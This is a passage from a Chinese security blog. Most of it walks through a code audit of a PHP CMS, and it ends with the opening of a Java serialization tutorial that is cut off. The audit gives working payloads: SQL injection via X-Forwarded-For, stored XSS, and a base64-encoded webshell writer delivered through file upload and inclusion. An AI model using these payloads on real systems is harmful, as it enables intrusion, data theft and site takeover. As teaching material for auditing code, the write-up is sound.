获取变量的整数值</p><h3 id="XFF头注入"><a href="#XFF头注入" class="headerlink" title="XFF头注入"></a>XFF头注入</h3><p>根据自动审计结果，查看下<code>/uploads/include/common.fun.php</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818160617812.png" alt="image-20210818160617812"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) </span><br><span class="line">&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$ip 的值从 HTTP_CLIENT_IP、HTTP_X_FORWARDED_FOR 等变量中获得，HTTP_CLIENT_IP 这个环境变量没有成标准，很多服务器没法获取。而第二个 HTTP_X_FORWARDED_FOR 可以通过 HTTP 请求头来修改。</p><p>全局搜索getip()这个函数</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818160954245.png" alt="image-20210818160954245"></p><p>查看<code>comment.php</code>发现，getip()返回值直接插入sql语句并执行，且没有任何过滤，存在sql注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;comment&#x27;</span>).<span class="string">&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string">VALUES (&#x27;&#x27;, &#x27;<span class="subst">$id</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$type</span>&#x27;, &#x27;<span class="subst">$mood</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;&quot;</span>.getip().<span class="string">&quot;&#x27;, &#x27;<span class="subst">$is_check</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>在文章评论处发现content字段的值回显，可在提交评论时抓包，构造X-Forwarded-For值进行注入。先补充好原本插入语句，再构造第二次恶意的插入语句，注意单引号的闭合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1&#39;,&#39;1&#39; ),(&quot;&quot;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,(database()),&#39;1&#39;,&#39;1</span><br></pre></td></tr></table></figure><p>相当于执行的sql语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line"> VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;1&#39;,&#39;1&#39; ),(&quot;&quot;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,(database()),&#39;1&#39;,&#39;1&#39;, &#39;$is_check&#39;)&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818162716384.png" alt="image-20210818162716384"></p><p>效果如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818162849575.png" alt="image-20210818162849575"></p><p>再查看``common.inc.php`, getip()返回值赋给变量online_ip，全局搜索这个变量，发现在/guest_book.php中也是未经过滤直接插入sql语句并执行。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818165016011.png" alt="image-20210818165016011"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO &quot;</span> . table(<span class="string">&#x27;guest_book&#x27;</span>) . <span class="string">&quot; (id, rid, user_id, add_time, ip, content) </span></span><br><span class="line"><span class="string">VALUES (&#x27;&#x27;, &#x27;<span class="subst">$rid</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;<span class="subst">$online_ip</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>来到留言处进行测试，发表留言时发现无论是否留言都会弹出留言内容不能为空，修改前端代码注释掉这个函数，路径是\templates\default\guest_book.htm</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818165537178.png" alt="image-20210818165537178"></p><p>可以正常留言了，content字段有回显</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818165700506.png" alt="image-20210818165700506"></p><p>构造XXF头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1&#39;,database())-- -</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818170842340.png" alt="image-20210818170842340"></p><p>留言如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818170933875.png" alt="image-20210818170933875"></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>在包含文件<code>common.inc.php</code>中注意到数据库编码方式为gb2312，这很可能导致宽字节注入。全局搜索login，在/admin/login.php中发现验证管理员登录账号密码的函数为check_admin()。找到check_admin()定义，这里的变量有单引号保护，加上$_POST变量的addslashes转义，刚好可以利用 %df 让转义的反斜线失去作用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_admin</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$pwd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="subst">$pwd</span>&#x27;)&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;num&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>登录处抓包（注意直接在浏览器输入 %df 会被 urlencode，所以应该抓包发送）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818173747096.png" alt="image-20210818173747096"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>在 user.php 文件，用户发布新闻功能，发现 content 没有使用 htmlspecialchars() 函数，而是 filter_data()，跟踪看一下，在 /uploads/include/common.fun.php 找到函数定义代码，只过滤了 script，iframe，frame，meta，link 等，这里可以用 a，img 等标签绕过。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818174947999.png" alt="image-20210818174947999"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_data</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$str</span> = preg_replace(<span class="string">&quot;/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;</span><br></pre></td></tr></table></figure><p>抓包修改内容</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818175810565.png" alt="image-20210818175810565"></p><p>访问对应新闻页面出现弹窗</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818175902312.png" alt="image-20210818175902312"></p><p>同样在修改个人资料功能，邮箱处的填写只对格式进行了限制，没有其他过滤，xss成功</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820143829292.png" alt="image-20210820143829292"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>user.php 的支付功能，可以通过 $_POST[‘pay’] 控制文件包含的路径，但是后面拼接了 /index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$act</span> == <span class="string">&#x27;pay&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;data/pay.cache.php&#x27;</span>;</span><br><span class="line"><span class="variable">$price</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>])) &#123;</span><br><span class="line">showmsg(<span class="string">&#x27;对不起，您没有选择支付方式&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;include/payment/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>].<span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方法</p><ul><li><p>%00截断</p><p>条件：magic_quotes_gpc = Off，PHP版本&lt;5.3.4</p></li><li><p>路径长度截断</p><p>条件：windows 下目录路径最大长度为256字节，超出部分将丢弃；linux 下目录最大长度为4096字节，超出长度将丢弃；PHP版本&lt;5.2.8</p></li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820100418279.png" alt="image-20210820100418279"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>user.php中的个人资料处可以上传个人头像，尝试上传图片马，上传成功，判断这里没有对上传的文件进行有效过滤，查看源码发现仅对文件类型进行了过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 上传图片</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">img_upload</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$dir</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$imgname</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="variable">$dir</span> = BLUE_ROOT.DATA.UPLOAD.date(<span class="string">&quot;Ym&quot;</span>).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$dir</span> = BLUE_ROOT.DATA.UPLOAD.<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>],<span class="keyword">$this</span>-&gt;allow_image_type))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;不允许的图片类型&lt;/font&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$imgname</span>))&#123;</span><br><span class="line">    <span class="variable">$imgname</span> = <span class="keyword">$this</span>-&gt;create_tempname().<span class="string">&#x27;.&#x27;</span>.<span class="keyword">$this</span>-&gt;get_type(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!mkdir(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;上传过程中创建目录失败&lt;/font&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imgname</span> = <span class="variable">$dir</span> . <span class="variable">$imgname</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;uploading(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$imgname</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(BLUE_ROOT, <span class="string">&#x27;&#x27;</span>, <span class="variable">$imgname</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;上传图片失败&lt;/font&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件包含图片马</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820103913660.png" alt="image-20210820103913660"></p><p>但这样后续利用不太方便，可以在图片马中插入重新写入一个马 hack.php 的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @fputs(fopen(base64_decode(<span class="string">&#x27;aGFjay5waHA=&#x27;</span>),w),base64_decode(<span class="string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKSA/PiA=&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含后可以看到目录下成功生成木马 hack.php</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820134644761.png" alt="image-20210820134644761"></p><h2 id="任意URL跳转"><a href="#任意URL跳转" class="headerlink" title="任意URL跳转"></a>任意URL跳转</h2><p>在用户登录时注意到中间有一个跳转页面</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820090340618.png" alt="image-20210820090340618"></p><p>对应的源码在user.php中，截取了相关的两行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$from</span> = !<span class="keyword">empty</span>(<span class="variable">$from</span>) ? base64_decode(<span class="variable">$from</span>) : <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line">showmsg(<span class="string">&#x27;欢迎您 &#x27;</span>.<span class="variable">$user_name</span>.<span class="string">&#x27; 回来，现在将转到...&#x27;</span>, <span class="variable">$from</span>);</span><br></pre></td></tr></table></figure><p>$from变量可以控制下一步跳转的url，且没有对此参数的过滤。</p><p>直接利用：将 <a href="https://www.baidu.com/">https://www.baidu.com</a> 编码为 <code>aHR0cHM6Ly93d3cuYmFpZHUuY29t</code> 改包放包后可以看到页面成功跳转到百度</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820094557895.png" alt="image-20210820094557895"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820094912595.png" alt="image-20210820094912595"></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>user.php 的编辑个人资料功能，直接调用 unlink 函数删除 $_POST[‘face_pic3’]，没有进行相应的检查，存在任意文件删除漏洞</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820135250596.png" alt="image-20210820135250596"></p><p>利用一下漏洞，抓包修改 act=edit_user_info ，post 添加 face_pic3，成功删除刚才写入的木马 hack.php</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210820135713467.png" alt="image-20210820135713467"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个cms问题较多发生在用户输入处，没有对其进行较好的过滤，一些变量明显没有限制到位或无限制，但它作为代码审计入门还是很友好的。以后还是得多总结，多反思，先自己审计审计，再看看别的师傅怎么审计的，不断借鉴。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="posts/36431.html"/>
      <url>posts/36431.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>序列化：将对象写入到IO流中</li><li>反序列化：从IO流中恢复对象</li><li>意义：序列化机制允许将实现序列化的Java对象转换为字节序列，这些字节序列可以保存在磁盘上，或通过网络传输，以达到以后恢复成原来的对象。序列化机制使得对象可以脱离程序的运行而独立存在。</li><li>使用场景：所有可在网络上传输的对象都必须是可序列化的，比如RMI（remote method invoke,即远程方法调用），传入的参数或返回的对象都是可序列化的，否则会出错；所有需要保存到磁盘的java对象都必须是可序列化的。通常建议：程序创建的每个JavaBean类都实现Serializeable接口。</li></ul><h1 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><ol><li>创建一个ObjectOutputStream输出流</li><li>调用ObjectOutputStream对象的writeObject输出可序列化对象</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;<span class="comment">//实现Serializable接口</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WriteObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//创建一个ObjectOutStream流</span></span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:\\test.txt&quot;</span>));</span><br><span class="line">            <span class="comment">//将对象序列化到文件</span></span><br><span class="line">            Person person = <span class="keyword">new</span> Person(<span class="string">&quot;wawyw&quot;</span>, <span class="number">18</span>);</span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            System.out.println(<span class="string">&quot;序列化成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><ol><li>创建一个ObjectInputStream输入流</li><li>调用ObjectInputStream对象的readObject()得到序列化的对象</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;<span class="comment">//实现Serializable接口</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化调用我这个构造方法了嘛？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//创建ObjectInputStream流</span></span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:\\test.txt&quot;</span>));</span><br><span class="line">            Person wawyw = (Person) ois.readObject(); <span class="comment">//反序列化成对象</span></span><br><span class="line">            System.out.println(wawyw);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Person&#123;name=&#x27;wawyw&#x27;, age=18&#125;</span></span><br></pre></td></tr></table></figure><p>输出告诉我们，反序列化并不会调用构造方法。反序列的对象是由JVM自己生成的对象，不通过构造方法生成。</p><h2 id="transient"><a href="#transient" class="headerlink" title="transient"></a>transient</h2><p>使用transient关键字选择不需要序列化的字段。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 